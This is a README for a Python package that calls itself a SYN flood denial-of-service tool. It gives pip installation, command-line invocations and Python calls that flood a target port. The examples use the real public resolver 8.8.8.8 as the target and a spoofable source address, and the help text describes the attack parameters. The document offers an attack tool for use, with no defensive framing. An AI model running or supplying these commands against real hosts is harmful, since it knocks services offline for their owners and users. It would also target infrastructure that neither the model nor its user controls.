![SynFlood logo](https://mauricelambert.github.io/info/python/security/SynFlood_small.png "SynFlood logo")

# SynFlood

## Description

This package implements a SYN flood attack (DOS attack: Denial Of Service).

## Requirements

This package require:

 - python3
 - python3 Standard Library
 - Scapy

## Installation

```bash
pip install SynFlood 
```

## Usages

### Command lines

```bash
python3 -m SynFlood --help

python3 SynFlood.pyz --verbose --dport 80 --source 0.0.0.0 --sport 45586 --interface 172.16.0. --data abc 8.8.8.8

SynFlood -h
SynFlood 8.8.8.8
SynFlood -v -p 80 -s 0.0.0.0 -P 45586 -i 172.16.0. -d abc 8.8.8.8
```

### Python3

```python
from SynFlood import synflood, conf_iface
synflood("8.8.8.8", 80, "0.0.0.0", 45586)
synflood("8.8.8.8", 80, "0.0.0.0", 45586, b"abc", conf_iface)
```

## Link

 - [Github Page](https://github.com/mauricelambert/SynFlood)
 - [Pypi](https://pypi.org/project/SynFlood/)
 - [Documentation](https://mauricelambert.github.io/info/python/security/SynFlood.html)
 - [Python Executable](https://mauricelambert.github.io/info/python/security/SynFlood.pyz)

## Help

```
usage: SynFlood [-h] [--dport DPORT] [--source SOURCE] [--sport SPORT] [--data DATA] [--verbose] [--interface INTERFACE] target

This script implements a SynFlood attack.

positional arguments:
  target                Target IP or hostname.

optional arguments:
  -h, --help            show this help message and exit
  --dport DPORT, -p DPORT
                        Destination port.
  --source SOURCE, -s SOURCE
                        Source IP.
  --sport SPORT, -P SPORT
                        Source port.
  --data DATA, -d DATA  Additional data
  --verbose, -v         Mode verbose (print debug message)
  --interface INTERFACE, -i INTERFACE
                        Part of the IP, MAC or name of the interface
```

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
